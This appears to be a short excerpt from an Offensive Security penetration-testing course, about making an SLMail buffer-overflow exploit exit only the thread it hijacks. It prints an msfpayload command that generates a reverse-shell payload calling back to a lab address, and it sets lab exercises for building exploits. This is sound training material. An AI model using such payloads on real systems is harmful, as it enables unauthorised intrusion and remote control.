  md: "# OFFENSIVE Security\nwww.offensive-security.com\n\nPenetration Testing with\
    \ Kali Linux\n\n# 7.8 - Improving the Exploit\n\nWhen using default Metasploit\
    \ Framework shellcode, the default exit method the shellcode uses, at the end\
    \ of shellcode execution, is the ExitProcess. This exit method will shut down\
    \ the whole mail service process, effectively killing the SLMail service, and\
    \ causing it to crash.\n\nIf the program we are exploiting is a threaded application\
    \ (which it is, in this instance), we can try to avoid crashing the service completely\
    \ by using an Exit Thread instead, which will just terminate the affected thread\
    \ of the program. This will make our exploit work without interrupting the usual\
    \ operations of the POP3 server, as well as allow us to repeatedly exploit the\
    \ server, and exit the shell without bringing down the service. To instruct mspayload\
    \ to use the ExitThread method during the shellcode generation, we can use the\
    \ following command:\n\n```\nroot@kali:~# msfpayload windows/shell_reverse_tcp\
    \ LHOST=10.0.0.4\nEXITFUNC=thread LPORT=443 R | msfcode -b \"\\x00\\x0a\\xdd\"\
    \n```\n\nTry generating the above shell and replacing it with your exploiting\
    \ shellcode. See what happens when you exit your shell, and if it behaves any\
    \ different from the previous shellcode used.\n\n# 7.8.1 - Exercises\n\n+   Update\
    \ the exploit so that SLMail still runs after exploitation.\nIn the Tools folder\
    \ on the Desktop of your Windows VM, there is a VulnServer.exe application. Using\
    \ the proof of concept from the following forum post, develop a working exploit:\n\
    \  - https://forums.offensive-security.com/showthread.php?t=2231"
